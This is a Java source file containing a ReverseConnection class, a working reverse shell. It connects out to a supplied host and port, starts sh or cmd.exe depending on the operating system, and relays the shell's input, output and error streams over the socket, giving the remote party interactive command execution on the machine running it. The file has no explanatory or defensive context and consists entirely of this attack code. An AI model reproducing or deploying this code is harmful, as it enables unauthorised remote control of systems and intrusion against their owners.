
import java.io.IOException;
import java.net.InetAddress;
import java.net.Socket;

public class ReverseConnection implements Runnable {

	private final InetAddress source;
	private final int reversePort;
	public static final String UNIX_SHELL = "sh";
	public static final String WINDOWS_SHELL = "cmd.exe";

	public ReverseConnection(InetAddress source, int reversePort) {
		this.source = source;
		this.reversePort = reversePort;
	}

	public void run() {
		System.out.println("Started a reverse connection to: "
				+ source.toString());
		try {
			Socket s = new Socket(source, reversePort);
			String os = System.getProperty("os.name").toLowerCase();
			String command;
			if (os.startsWith("windows")) {
				command = WINDOWS_SHELL;
			} else {
				command = UNIX_SHELL;
			}
			Process process = Runtime.getRuntime().exec(command);
			Pipe processInToSocketOut = new Pipe(process.getInputStream(),
					s.getOutputStream());
			Pipe processErrorToSocketOut = new Pipe(process.getErrorStream(),
					s.getOutputStream());
			Pipe socketInToProcessOut = new Pipe(s.getInputStream(),
					process.getOutputStream());

			Thread t = new Thread(socketInToProcessOut);
			t.start();
			Thread t2 = new Thread(processErrorToSocketOut);
			t2.start();
			Thread t3 = new Thread(processInToSocketOut);
			t3.start();

			t.join();
			t2.join();
			t3.join();

			process.waitFor();

		} catch (IOException e) {
			e.printStackTrace();
		} catch (InterruptedException e) {
			e.printStackTrace();
		} finally {
			System.out.println("Reverse connection closed.");
		}
	}
}